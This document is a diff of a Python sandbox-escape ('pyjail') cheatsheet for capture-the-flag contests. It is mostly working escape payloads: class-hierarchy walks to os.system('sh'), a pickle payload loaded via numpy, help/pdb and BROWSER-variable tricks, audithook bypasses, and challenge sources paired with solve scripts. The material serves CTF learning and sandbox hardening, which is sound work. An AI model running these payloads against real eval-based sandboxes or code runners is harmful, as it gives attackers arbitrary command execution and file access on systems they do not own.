@@ -1,11 +1,12 @@
 ---
 title: 'Pyjail Cheatsheet'
-date: '2024-08-21'
+date: '2024-11-24'
 category: 'cheatsheet'
-description: ""
+description: ''
 tags:
   - 'python3'
   - 'sandbox'
+  - 'pyjail'
   - 'dunder methods'
 ---
 
@@ -14,6 +15,7 @@ tags:
 ## Sinks
 
 ### retrieving builtins
+
 ```py
 # obtain builtins from a globally defined built-in functions
 # https://docs.python.org/3/library/functions.html
@@ -40,6 +42,7 @@ func.__globals__['__builtins__']
 ```
 
 ### good to know built-in functions and methods
+
 ```py
 breakpoint() # pdb -> import os; os.system("sh")
 exec(input()) # import os; os.system("sh")
@@ -68,9 +71,13 @@ license._Printer__filenames = ['/flag.txt']; license()
 ```
 
 ### subclasses
+
 ```py
 # <class '_frozen_importlib.BuiltinImporter'>
 ().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh");
+
+# <class '_frozen_importlib_external.FileLoader'>
+().__class__.__bases__[0].__subclasses__()[118].get_data(".", "/flag.txt")
 
 # <class '_io._IOBase'> -> <class '_io._RawIOBase'> -> <class '_io.FileIO'>
 ().__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]("/flag.txt").read()
@@ -78,6 +85,7 @@ license._Printer__filenames = ['/flag.txt']; license()
 # <class 'os._wrap_close'>
 ().__class__.__mro__[1].__subclasses__()[137].__init__.__builtins__["__import__"]("os").system("sh")
 ().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["system"]("sh")
+().__class__.__mro__[1].__subclasses__()[137].close.__globals__["system"]("sh")
 
 # <class 'subprocess.Popen'>
 ().__class__.__mro__[1].__subclasses__()[262](["cat","/flag.txt"], stdout=-1).communicate()[0]
@@ -85,12 +93,13 @@ license._Printer__filenames = ['/flag.txt']; license()
 # <class 'abc.ABC'> -> <class 'abc.ABCMeta'>
 ().__class__.__mro__[1].__subclasses__()[129].__class__.register.__builtins__["__import__"]("os").system("sh")
 
-# <class '_frozen_importlib_external.FileLoader'>
-()._＿class_＿._＿bases_＿[0]._＿subclasses_＿()[118].get_data(".", "/flag.txt")
+# <class 'collections.Counter'>
+{}.__class__.__subclasses__()[2].copy.__builtins__["__import__"]("os").system("sh")
+{}.__class__.__subclasses__()[2].update.__builtins__["__import__"]("os").system("sh")
 
 # <class 'generator'> - instance
 (_ for _ in ()).gi_frame.f_globals["__loader__"].load_module("os").system("sh")
-(_ for _ in ()).gi_frame.f_globals["__builtins__"].__import__('os').system('sh')
+(_ for _ in ()).gi_frame.f_globals["__builtins__"].__import__("os").system("sh")
 
 # <class 'async_generator'> - instance
 (await _ for _ in ()).ag_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
@@ -98,6 +107,7 @@ license._Printer__filenames = ['/flag.txt']; license()
 ```
 
 ### popular modules
+
 ```py
 # sys
 sys = __import__("sys")
@@ -118,12 +128,18 @@ io.open("/flag.txt").read()
 io.open("/etc/passwd").buffer.raw.__class__("/flag.txt").read()
 
 # numpy
+numpy.fromfile("/flag.txt", dtype=numpy.uint8)
+numpy.rec.fromfile("/flag.txt", formats="i1")
 numpy.loadtxt("/flag.txt") # stderr
+
+numpy.savetxt("/tmp/exp", ["\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x8c\x06system\x93\x94\x94h\x01\x8c\x02sh\x85R."], fmt='%s', encoding="latin-1") # any pickle to execute, ie: `pickora -c 'from os import system; system("sh")'`
+numpy.load("/tmp/exp", allow_pickle=True) # https://numpy.org/doc/stable/reference/generated/numpy.load.html
 ```
 
 ## Bypasses and payloads
 
 ### decorators
+
 ```py
 @exec
 @input
@@ -139,6 +155,7 @@ class a:...
 ```
 
 ### unicode bypass
+
 ```py
 # https://lingojam.com/ItalicTextGenerator
 
@@ -165,11 +182,13 @@ obj = cobj()
 ```
 
 ### audithook bypass
+
 ```py
 import sys, os
 sys.addaudithook((lambda x: lambda *_: x(1))(os._exit))
 # Note that most of the imports below would trigger the audit event if not already imported before setting up the audithook, see: https://github.com/python/cpython/issues/116840
 ```
+
 ```py
 # https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/#fnref5
 # https://github.com/python/cpython/issues/115322
@@ -194,9 +213,11 @@ multiprocessing.util.spawnv_passfds(b"/bin/sh", ["/bin/sh", "-c", "cat /flag.txt
 ```
 
 ### assigning attributes and variables
+
 ```py
 class cobj:...
 ```
+
 ```py
 # walrus operator (>= python3.8)
 [a:=().__doc__, print(a)]
@@ -210,13 +231,16 @@ cobj.__setattr__("field", "value"), print(cobj.field)
 
 # list comprehension
 [cobj for cobj.field in ["value"]], print(cobj.field)
+[1 for cobj.field in ["value"]], print(cobj.field)
 ```
 
 ### getting attributes
+
 ```py
 class cobj:...
 obj = cobj()
 ```
+
 ```py
 # eval
 # getattr
@@ -258,20 +282,31 @@ system("cat /flag.txt")
 ```
 
 ### running functions and methods without parenthesis
+
 ```py
 class cobj:...
 obj = cobj()
 ```
-```py
-# list comprehension
-[+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]][0]
-[obj["print(123)"] for obj.__class__.__getitem__ in [eval]][0]
 
-# from builtin modules
+```py
+# list comprehension (exec & eval)
+[+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]]
+[obj["print(123)"] for obj.__class__.__getitem__ in [eval]]
+
+# from builtin modules (exec & eval) - <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>
 [f"{license}" for license._Printer__setup in [breakpoint]]
+
+[f"{copyright}" for copyright.__class__.__str__ in [breakpoint]]
+[+license for license.__class__.__pos__ in [breakpoint]]
+[-quit for quit.__class__.__neg__ in [breakpoint]]
+[help["ls"] for help.__class__.__getitem__ in [system]]
+
+# @hashkitten (exec)
+from os import system as __getattr__; from __main__ import sh
 ```
 
 ### deleting variables
+
 ```py
 # exec
 # try...except
@@ -289,60 +324,123 @@ print(delete_me) # error
 ```
 
 ## General stuff
+
 ### environment variables
+
 - https://www.elttam.com/blog/env/#python
 - `PYTHONINSPECT`, `PYTHONHOME`, `PYTHONPATH`, `PYTHONWARNINGS`, `BROWSER`
-    - `help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")`
-    - `help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh -c "cat /flag.txt" #%s')))` - ref: https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html
+  - `help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")`
+  - `help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh -c "cat /flag.txt" #%s')))` - ref: https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html
 
 ### magic methods
+
 - https://rszalski.github.io/magicmethods/#appendix1
 
+### help
+
+- use of pager (ie. less) to escape sandbox
+- list modules by entering `modules`
+- load modules by entering module names:
+  - `__main__` - should already be loaded, help page shown if so
+  - `pdb` - similar to importing pdb
+  - `antigravity` - similar to importing antigravity
+  - `PROGRAM_NAME` / `jail` / `app` - similar to importing and rerunning program if not wrapped in `if __name__ == "__main__":`
+- see [SECCON Beginners CTF 2022: hitchhike4b](https://github.com/SECCON/Beginners_CTF_2022/blob/main/misc/hitchhike4b/writeup.md)
+
+```py
+# load pdb from help in order to call breakpoint/pdb.set_trace() without __import__ in builtins
+().__class__.__base__.__subclasses__()[158]()() # help()
+pdb # load pdb into imported modules
+app # the name of the main program in order to import / "rerun" the program
+"".__class__.__base__.__subclasses__()[155].close.__globals__["sys"].modules["pdb"].set_trace() # sys.modules["pdb"].set_trace()
+
+# overwrite BROWSER env for RCE through antigravity in help
+[[1for __import__("os").environ["BROWSER"] in ['/bin/sh -c "cat /flag.txt" #%s']], help()]
+antigravity
+```
+
 ### stable payloads
+
 ```py
 # @salvatore-abello - type.__subclasses__(type)[0] -> <class 'abc.ABCMeta'>
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # need __import__
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")
 
-# <function __newobj__ at 0x7f0000000000> - need __import__
+# <function __newobj__ at 0x7f0000000000> - need __import__ tho
 [].__reduce_ex__(3)[0].__globals__["__builtins__"]["__import__"]("os").system("sh")
 [].__reduce_ex__(3)[0].__builtins__["__import__"]("os").system("sh")
 ```
 
 ### finding sinks from modules
-- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
-- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code
 
-### bullet points
-- `f"{65:c}"` can format an int to char (equivalent to `"%c" % 65  == chr(65) == "A"`)
-    - `"".encode().fromhex("41").decode()` parses hex into string
+- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
+  - `__import__("ctypes")._aix.environ`
+- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code
+  - `__import__("_aix_support").sys`
+
+### generic classes / bullet points
+
+- `f"{65:c}"` can format an int to char (equivalent to `"%c" % 65 == chr(65) == "A"`)
+  - `"".encode().fromhex("41").decode()` parses hex into string
 - `type`
-    - `[].__class__.__class__`
-    - `"".__class__.__class__`
+  - `[].__class__.__class__`
+  - `"".__class__.__class__`
 - `object`
-    - `[].__class__.__mro__[1]`
-    - `[].__class__.__bases__[0]`
-    - `[].__class__.__base__`
+  - `[].__class__.__mro__[1]`
+  - `[].__class__.__bases__[0]`
+  - `[].__class__.__base__`
 - `str`
-    - `"".__class__`
-    - `[].__doc__.__class__`
-    - `[].__class__.__module__.__class__`
+  - `"".__class__`
+  - `[].__doc__.__class__`
+  - `[].__class__.__module__.__class__`
 - `tuple`
-    - `[].__class__.__bases__.__class__`
+  - `[].__class__.__bases__.__class__`
 - `dict`
-    - `{}.__class__`
-    - `obj.__dict__.__class__`
-    - `"".__class__.__dict__.copy().__class__`
+  - `{}.__class__`
+  - `obj.__dict__.__class__`
+  - `"".__class__.__dict__.copy().__class__`
 - `class instances`:
-    - `class cobj:...`
-        - `obj = cobj()`
-    - `type("cobj", (object,), {})()`
-        - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()`
+  - `class cobj:...`
+    - `obj = cobj()`
+  - `type("cobj", (object,), {})()`
+    - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()`
 
 ## CTF
 
+### SECCON CTF 13: 1linepyjail
+
+- `jail.py`
+
+```py
+print(eval(code, {"__builtins__": None}, {}) if len(code := input("jail> ")) <= 100 and __import__("re").fullmatch(r'([^()]|\(\))*', code) else ":(")
+```
+
+- `solve.py`
+
+```py
+# @Ark - rerun w/ help while adding pdb to loaded sys modules
+"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["help"]()
+pdb
+jail
+"".__class__.__base__.__subclasses__()[141].__init__.__globals__["sys"].modules["pdb"].set_trace()
+"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat /flag-*.txt")
+
+# @maple3142 - overwrite dunder to call breakpoint
+[c:={}.__class__.__subclasses__()[2],b:=c.copy.__builtins__,[-c()for c.items in[b['breakpoint']]]]
+
+# @keymoon - retrieve help from <class 'enum._EnumDict'>
+{}.__class__.__subclasses__()[3].update.__globals__['bltns'].help()
+# and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system
+
+# @SuperFashi / @ierae - retrieve help from <class '_sitebuiltins._Helper'>
+().__class__.__base__.__subclasses__()[158]()()
+# and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system
+```
+
 ### idekCTF 2024: crator
+
 - `sandbox.py`
+
 ```py
 builtins_whitelist = set(
     (
@@ -484,7 +582,9 @@ class Sandbox(object):
             if key in sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__:
                 del sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__[key]
 ```
+
 - `chall.py`
+
 ```py
 @app.route('/submit/<problem_id>', methods=['GET', 'POST'])
 @login_required
@@ -521,7 +621,9 @@ def submit(problem_id):
             submission_case.status = 'Accepted'
     ...
 ```
+
 - `solve.py`
+
 ```py
 # @Starlight - retrieve open from closure
 open = open.__closure__[0].cell_contents
@@ -570,7 +672,9 @@ print(fake)
 ```
 
 ### UIUCTF 2024: ASTea
+
 - `chall.py`
+
 ```py
 import ast
 
@@ -604,7 +708,9 @@ ast.fix_missing_locations(cup)
 
 exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import, 'safe_call': safe_call})
 ```
+
 - `solve.py`
+
 ```py
 # (a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= {"safe_import": safe_import, "safe_call": safe_call, "help": b}; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
 __builtins__ |= safe_import.__builtins__;
@@ -626,7 +732,9 @@ f"{license}"
 ```
 
 ### vsCTF 2024: llama-jail-revenge
+
 - `chall.py`
+
 ```py
 #!/usr/local/bin/python
 from exec_utils import safe_exec
@@ -651,7 +759,9 @@ if __name__ == "__main__":
     except AssertionError as err:
         print(err)
 ```
+
 - `exec_utils.py`
+
 ```py
 # code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py
 # was main at the time of writing chall, however commit provided incase of changes
@@ -829,6 +939,7 @@ def safe_exec(
 ```
 
 - `solve.py`
+
 ```py
 # Using "with"-statement context managers to expose/retrieve Exception classes
 # https://rszalski.github.io/magicmethods/#context
@@ -852,7 +963,9 @@ except ex as e:
 ```
 
 ### UofTCTF 2024: Zero
+
 - `chal.py`
+
 ```py
 def check(code):
     # no letters
@@ -875,7 +988,9 @@ def safe_eval(code):
 code = input(">>> ")
 safe_eval(code)
 ```
+
 - `solve.py`
+
 ```py
 [*()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_)[[]>[]].𝘳𝘦𝘨𝘪𝘴𝘵𝘦𝘳._＿𝘣𝘶𝘪𝘭𝘵𝘪𝘯𝘴＿_.𝘷𝘢𝘭𝘶𝘦𝘴()][([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])](""._＿𝘥𝘰𝘤＿_[([]==[])+([]==[])+([]==[])+([]==[])]+""._＿𝘥𝘰𝘤＿_[[]>[]]).𝘴𝘺𝘴𝘵𝘦𝘮(""._＿𝘥𝘰𝘤＿_[[]>[]]+""._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘥𝘰𝘤＿_[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])])
 
@@ -884,7 +999,9 @@ safe_eval(code)
 ```
 
 ### GlacierCTF 2023: Avatar
+
 - `server.py`
+
 ```py
 print("You get one chance to awaken from the ice prison.")
 code = input("input: ").strip()
@@ -896,7 +1013,9 @@ if any([x not in whitelist for x in code]) or len(code) > 40000:
 
 eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})
 ```
+
 - `solve.py`
+
 ```py
 m = b"""[a for a in ().__class__.__base__.__subclasses__() if 'wrapper' not in f'{a.__init__}'][0].__init__.__builtins__['__import__']('os').system('sh')"""
 print(m)
@@ -958,7 +1077,9 @@ print(eval(payload)) # verify payload is the same
 ```
 
 ### TFC CTF 2023: My Third Calculator
+
 - `server.py`
+
 ```py
 import sys
 print("This is a safe calculator")
@@ -975,14 +1096,18 @@ fns = {
 }
 print(eval(inp, fns, fns))
 ```
+
 - `solve.py`
+
 ```py
 # [setattr(__import__('os'), 'environ', {'BROWSER': '/bin/sh -c "cat /flag" #%s'}), __import__('antigravity')]
 [𝘴𝘦𝘵𝘢𝘵𝘵𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__('\\157\\163'), '\\145\\156\\166\\151\\162\\157\\156', {'\\102\\122\\117\\127\\123\\105\\122':'\\57\\142\\151\\156\\57\\163\\150\\40\\55\\143\\40\\42\\143\\141\\164\\40\\57\\146\\154\\141\\147\\42\\40\\43\\45\\163'}), __𝘪𝘮𝘱𝘰𝘳𝘵__('\\141\\156\\164\\151\\147\\162\\141\\166\\151\\164\\171')]
 ```
 
 ### Equinor CTF 2023: Dis is it!
+
 - `main.py`
+
 ```py
 from flask import Flask, request, redirect, send_from_directory
 import dis
@@ -1034,7 +1159,9 @@ def disassemble():
 if __name__ == '__main__':
     app.run('0.0.0.0', 1337)
 ```
+
 - `solve.py`
+
 ```py
 # @null
 import requests
@@ -1056,7 +1183,9 @@ print(requests.get(target + '/report/flag.txt').text)
 ```
 
 ### 37C3 Potluck CTF: tacocat
+
 - `main.py`
+
 ```py
 while True:#
     x = input("palindrome? ")#
@@ -1075,7 +1204,9 @@ while True:#
 #)" ?emordnilap"(tupni = x
 #:eurT elihw
 ```
+
 - `solve.py`
+
 ```py
 # setting up template for generating palindromes
 alph = "abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\\"#¤%&/()=?@$€{[]}"
@@ -1154,7 +1285,9 @@ sh.interactive()
 ```
 
 ### Internet Festival 2023 CTF Finals: prison
+
 - `prison.py`
+
 ```py
 #!/usr/bin/env python3
 
@@ -1178,7 +1311,9 @@ def main():
 if __name__ == '__main__':
         main()
 ```
+
 - `solve.py`
+
 ```py
 from pwn import *
 io = remote("challs.ifctf.fibonhack.it", 10010)
@@ -1195,7 +1330,9 @@ io.interactive()
 ```
 
 ### WACON 2023 Prequal: ScavengerHunt
+
 - `prob.py`
+
 ```py
 #!/usr/bin/env python3
 import secret
@@ -1223,13 +1360,17 @@ except:
     pass
 exit(0)
 ```
+
 - `secret.py`
+
 ```py
 __builtins__ = {}
 
 some_unknown_and_very_long_identifier_name = "WACON2023{[REDACTED]}"
 ```
+
 - `solve.py`
+
 ```py
 from pwn import *
 import time
@@ -1273,7 +1414,9 @@ print(flag)
 ```
 
 ### CrewCTF 2023: starship-1
+
 - `sandbox.py`
+
 ```py
 #!/usr/bin/env python3
 import re
@@ -1319,7 +1462,9 @@ if prompt.isascii() and not re.findall(f'[{banned}]', prompt):
     except:
         pass
 ```
+
 - `solve.py`
+
 ```py
 # @quasar - eval("__import__('os').system('sh')")
 a = """@__build_class__.__self__.eval
@@ -1381,8 +1526,10 @@ p.interactive()
 ```
 
 ### CrewCTF 2023: starship
+
 - `server.py`
-```py
+
+`````py
 #!/usr/bin/env python
 import re
 import sys
@@ -1467,8 +1614,10 @@ try:
     exec(prompt)
 except:
     pass
-```
+`````
+
 - `solve.py`
+
 ```py
 # @quasar - setting sys.stdout.flush to breakpoint
 [id for sys.stdout.flush in [id.__self__.__dict__[mA] for aA,bA,cA,dA,eA,fA,gA,hA,iA,jA,kA,lA,mA,nA,oA,pA,qA,rA,sA,tA,uA,vA,wA,xA,yA,zA,aB,bB,cB,dB,eB,fB,gB,hB,iB,jB,kB,lB,mB,nB,oB,pB,qB,rB,sB,tB,uB,vB,wB,xB,yB,zB,aC,bC,cC,dC,eC,fC,gC,hC,iC,jC,kC,lC,mC,nC,oC,pC,qC,rC,sC,tC,uC,vC,wC,xC,yC,zC,aD,bD,cD,dD,eD,fD,gD,hD,iD,jD,kD,lD,mD,nD,oD,pD,qD,rD,sD,tD,uD,vD,wD,xD,yD,zD,aE,bE,cE,dE,eE,fE,gE,hE,iE,jE,kE,lE,mE,nE,oE,pE,qE,rE,sE,tE,uE,vE,wE,xE,yE,zE,aF,bF,cF,dF,eF,fF,gF,hF,iF,jF,kF,lF,mF,nF,oF,pF,qF,rF,sF,tF,uF,vF,wF,xF,yF,zF,aG in [id.__self__.__dict__]]]
@@ -1506,7 +1655,9 @@ io.interactive()
 ```
 
 ### CrewCTF 2023: setjail
+
 - `main.py`
+
 ```py
 import re
 import ast
@@ -1574,7 +1725,9 @@ elif last_attr_key is not None:
 
 print("Done")
 ```
+
 - `solve.py`
+
 ```py
 # @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
 import: ctypes._aix
@@ -1591,7 +1744,9 @@ value: "1"
 ```
 
 ### CrewCTF 2023: jailpie
+
 - `server.py`
+
 ```py
 #!/usr/local/bin/python3
 import base64
@@ -1628,13 +1783,17 @@ if __name__ == '__main__':
     # except:
     #     _print('Nice try!')
 ```
+
 - `solve.py`
+
 ```py
 # TBA
 ```
 
 ### SEETF 2023: Another PyJail
+
 - `server.py`
+
 ```py
 from types import CodeType
 
@@ -1653,7 +1812,9 @@ def clear(code):
 
 print(eval(clear(compile(input("> "), __name__, "eval")), {'__builtins__': {}}, {})(getattr))
 ```
+
 - `solve.py`
+
 ```py
 @ juliapoo
 lambda g: (
@@ -1758,17 +1919,23 @@ print(val)
 ```
 
 ### BYUCTF 2023: Builtins 1
+
 - `b1.py`
+
 ```py
 print(eval(input("code> "), {"__builtins__": {}}, {"__builtins__": {}}))
 ```
+
 - `solve.py`
+
 ```py
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")
 ```
 
 ### BYUCTF 2023: Builtins 2
+
 - `b2.py`
+
 ```py
 inp = input("code> ")[:72]
 if "__" in inp:
@@ -1776,39 +1943,31 @@ if "__" in inp:
 else:
     print(eval(inp, {"__builtins__": {}}, {"__builtins__": {}}))
 ```
+
 - `solve.py`
+
 ```py
 ()._＿class＿_._＿base＿_._＿subclasses＿_()[118].get_data('.','flag.txt')
 ```
 
 ### BYUCTF 2023: a-z0-9
+
 - `a-z0-9.py`
+
 ```py
 eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
 ```
+
 - `solve.py`
+
 ```py
 __𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(𝘰𝘳𝘥('ʚ')-𝘰𝘳𝘥('ȫ'))+𝘤𝘩𝘳(𝘰𝘳𝘥('ř')-𝘰𝘳𝘥('æ'))).𝘴𝘺𝘴𝘵𝘦𝘮(𝘤𝘩𝘳(𝘰𝘳𝘥('ř')-𝘰𝘳𝘥('æ'))+𝘤𝘩𝘳(𝘰𝘳𝘥('ȉ')-𝘰𝘳𝘥('ơ')))
 ```
 
-### BYUCTF 2023: Leet 1
-- `leet1.py`
-```py
-import re
-FLAG = open('flag.txt').read()
-inp = input('> ')
-if re.search(r'\d', inp) or eval(inp) != 1337:
-    print('Nope')
-else:
-    print(FLAG)
-```
-- `solve.py`
-```py
-[_:=[]>[],~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~